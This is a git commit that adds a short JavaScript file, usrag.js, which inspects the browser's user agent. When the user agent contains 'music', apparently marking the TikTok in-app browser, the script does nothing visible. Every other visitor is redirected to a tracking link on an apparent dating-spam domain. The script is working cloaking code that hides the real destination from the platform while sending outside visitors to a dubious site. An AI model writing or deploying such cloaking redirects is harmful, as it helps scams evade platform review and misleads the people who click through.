487db2f5a614671f0f323f777966887b99086b93
tik1tok <jardeinsharon57@gmail.com>
2025-01-09 22:38:16 +0200

    Update and rename script.js to usrag.js

---
+++ usrag.js
@@ -0,0 +1,9 @@
+let agent = navigator.userAgent;
+
+if (agent.indexOf('music') >= 0) {
+  console.log('in tiktok app');
+} else {
+  window.location = 'https://r3n2br5.your-partnerstheflirting.com/y7wbku6';
+//  window.location = 'https://r3n2br5.your-partnerstheflirting.com/y7wbku6';
+}
+// document.querySelector('body').innerText = agent;
